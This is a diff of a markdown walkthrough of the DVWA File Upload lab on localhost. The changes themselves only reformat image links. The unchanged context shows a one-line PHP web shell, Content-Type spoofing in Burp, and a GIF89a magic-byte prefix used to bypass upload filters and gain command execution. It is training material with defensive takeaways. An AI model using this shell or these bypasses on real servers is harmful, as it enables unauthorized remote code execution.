@@ -23,15 +23,16 @@ Navigate to the **File Upload** section and inspect the form to see how the
 application handles submitted files, whether it checks file extension, MIME
 type, or content.
 
-`![Low - upload page](./images/low-01-upload-page.png)`
+![alt text](./images/low-01-upload-page.png)
+
 
 ### Step 2: Select and Upload the Payload
 
 Select the PHP web shell (`anup.php`) via the file picker and submit it through the form.
 
-`![Low - selecting anup.php in file picker](./images/low-02-file-picker.png)`
+![alt text](./images/low-02-file-picker.png)
 
-`![Low - anup.php selected, ready to upload](./images/low-03-file-selected.png)`
+![alt text](./images/low-03-file-selected.png)
 
 ### Step 3: Confirm the Vulnerability, No Filtering + Path Disclosure
 
@@ -46,7 +47,7 @@ This is a secondary issue on its own, path disclosure. Even if upload
 restrictions existed, telling the attacker exactly where the file landed
 removes the need to guess or brute-force the path.
 
-`![Low - upload success message revealing the storage path](./images/low-04-upload-success-path.png)`
+![alt text](./images/low-04-upload-success-path.png)
 
 ### Step 4: Access the Uploaded Payload
 
@@ -57,7 +58,7 @@ http://localhost/hackable/uploads/anup.php
 The server parses `.php` files inside the uploads directory, so the script
 executes. A blank page is expected here since the shell has no `cmd` parameter yet.
 
-`![Low - navigating to the uploaded PHP file](./images/low-05-blank-execution.png)`
+![alt text](./images/low-05-blank-execution.png)
 
 ### Step 5: Achieve Remote Code Execution
 
@@ -68,7 +69,7 @@ http://localhost/hackable/uploads/anup.php?cmd=ls /
 The root directory listing is returned, confirming full **Remote Code
 Execution (RCE)**.
 
-`![Low - RCE confirmed via cmd parameter](./images/low-06-rce-confirmed.png)`
+![alt text](./images/low-06-rce-confirmed.png)
 
 **Low level: complete.**
 
@@ -82,21 +83,21 @@ extension or file contents.
 
 ### Step 1: Check the Upload Form
 
-`![Medium - upload page](./images/medium-01-upload-page.png)`
+![alt text](./images/medium-01-upload-page.png)
 
 ### Step 2: Attempt a Direct PHP Upload
 
 Try submitting `anup.php` as-is, no manipulation, to see whether the raw
 upload is now blocked.
 
-`![Medium - selecting a file to upload](./images/medium-02-file-picker.png)`
+![alt text](./images/medium-02-file-picker.png)
 
 The response confirms a filter is now active:
 ```
 Your image was not uploaded. We can only accept JPEG or PNG images.
 ```
 
-`![Medium - upload rejected, JPEG or PNG only](./images/medium-03-rejected-content-type.png)`
+![alt text](./images/medium-03-rejected-content-type.png)
 
 ### Step 3: Identify What's Actually Being Checked
 
@@ -118,7 +119,7 @@ Content-Disposition: form-data; name="uploaded"; filename="anup.php"
 Content-Type: image/jpeg
 ```
 
-`![Medium - Burp request with Content-Type spoofed to image/jpeg](./images/medium-04-burp-content-type-bypass.png)`
+![alt text](./images/medium-04-burp-content-type-bypass.png)
 
 The server is fooled into accepting the file as a harmless image and stores it.
 
@@ -129,7 +130,7 @@ The application again discloses the storage path:
 ../../hackable/uploads/anup.php succesfully uploaded!
 ```
 
-`![Medium - upload success, path disclosed](./images/medium-05-upload-success-path.png)`
+![alt text](./images/medium-05-upload-success-path.png)
 
 ### Step 6: Execute the Shell and Confirm RCE
 
@@ -138,14 +139,14 @@ Navigate to the uploaded file and pass a command:
 http://localhost/hackable/uploads/anup.php?cmd=ls
 ```
 
-`![Medium - directory listing via cmd parameter](./images/medium-06-cmd-ls.png)`
+![alt text](./images/medium-06-cmd-ls.png)
 
 A broader listing confirms full system access:
 ```
 http://localhost/hackable/uploads/anup.php?cmd=ls +/
 ```
 
-`![Medium - root directory listing confirms RCE](./images/medium-07-root-listing.png)`
+![alt text](./images/medium-07-root-listing.png)
 
 **Medium level: complete.** Key takeaway: `Content-Type` is a client-supplied,
 trivially spoofable header. It should never be trusted as the sole file-type check.
@@ -165,8 +166,7 @@ same message as Medium:
 ```
 Your image was not uploaded. We can only accept JPEG or PNG images.
 ```
-
-`![High - rejected, JPEG or PNG only](./images/high-02-rejected.png)`
+![alt text](./images/high-02-rejected.png)
 
 ### Step 2: Test Whether Content-Type Spoofing Alone Still Works
 
@@ -183,7 +183,7 @@ Repeat the Medium-level bypass, keep the `.php` extension, but change
 Rename the upload's filename to `anup.jpg`, keep `Content-Type: image/jpeg`,
 but leave the raw PHP payload as the file body with no image file signature.
 
-`![High - filename anup.jpg, image/jpeg content-type, no magic bytes](./images/high-04-jpg-no-magic-bytes.png)`
+![alt text](./images/high-04-jpg-no-magic-bytes.png)
 
 **Result: still rejected.** This indicates the server is also checking the
 file's actual content, specifically, the file signature (magic bytes) at
@@ -200,7 +200,7 @@ GIF89a
 <?php system($_REQUEST[cmd]); ?>
 ```
 
-`![High - Burp request with GIF89a magic bytes prepended](./images/high-05-magic-bytes-bypass.png)`
+![alt text](./images/high-05-magic-bytes-bypass.png)
 
 **Result: upload succeeds.**
 ```
